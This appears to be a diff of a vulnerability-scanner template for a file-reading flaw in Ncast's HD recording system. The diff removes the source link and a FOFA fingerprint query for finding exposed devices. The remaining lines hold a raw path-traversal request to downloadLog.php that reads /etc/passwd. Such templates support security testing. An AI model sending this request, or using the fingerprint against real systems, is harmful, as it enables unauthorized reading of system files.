@@ -3,12 +3,8 @@ info:
   name: Ncast盈可视 高清智能录播系统 文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rhb3m0qn14kgwolg'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rhb3m0qn14kgwolg
-    fofa: app="Ncast-产品" && title=="高清智能录播系统"&&web.icon=="76e408df455fde9ec28aa2eb18ae499a"
 http:
 - raw:
   - 'GET /developLog/downloadLog.php?name=../../../../etc/passwd HTTP/1.1
